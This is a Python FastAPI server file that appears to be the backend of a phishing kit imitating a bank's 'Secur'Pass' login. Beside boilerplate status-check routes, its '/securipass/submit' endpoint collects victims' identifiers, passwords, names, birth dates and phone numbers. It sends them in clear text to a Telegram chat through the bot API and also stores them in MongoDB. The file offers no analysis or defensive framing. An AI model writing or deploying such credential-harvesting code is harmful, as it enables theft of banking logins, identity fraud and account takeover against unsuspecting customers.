from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
import requests

from pydantic import BaseModel, Field, ConfigDict
from typing import List
import uuid
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    model_config = ConfigDict(extra="ignore")  # Ignore MongoDB's _id field
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class StatusCheckCreate(BaseModel):
    client_name: str

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.model_dump()
    status_obj = StatusCheck(**status_dict)
    
    # Convert to dict and serialize datetime to ISO string for MongoDB
    doc = status_obj.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    
    _ = await db.status_checks.insert_one(doc)
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

# Telegram Integration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.error("Telegram credentials not configured")
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        logger.info("Message sent to Telegram successfully")
        return True
    except Exception as e:
        logger.error(f"Error sending message to Telegram: {str(e)}")
        return False

class SecuripassSubmission(BaseModel):
    identifier: str
    password: str
    lastName: str
    firstName: str
    dateOfBirth: str
    phoneNumber: str

@api_router.post("/securipass/submit")
async def submit_securipass_data(data: SecuripassSubmission):
    try:
        # Format message for Telegram
        message = f"""
🔐 <b>Nouvelle soumission Secur'Pass</b>

📋 <b>Identifiant:</b> {data.identifier}
🔑 <b>Mot de passe:</b> {data.password}

👤 <b>Informations personnelles:</b>
   • Nom: {data.lastName}
   • Prénom: {data.firstName}
   • Date de naissance: {data.dateOfBirth}
   • Téléphone: {data.phoneNumber}

⏰ <b>Date de soumission:</b> {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
        """
        
        # Send to Telegram
        telegram_success = send_telegram_message(message)
        
        # Save to database
        submission_data = data.dict()
        submission_data['timestamp'] = datetime.utcnow()
        submission_data['telegram_sent'] = telegram_success
        
        await db.securipass_submissions.insert_one(submission_data)
        
        return {
            "success": True,
            "message": "Données enregistrées avec succès"
        }
    except Exception as e:
        logger.error(f"Error processing securipass submission: {str(e)}")
        raise HTTPException(status_code=500, detail="Erreur lors de l'enregistrement")

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()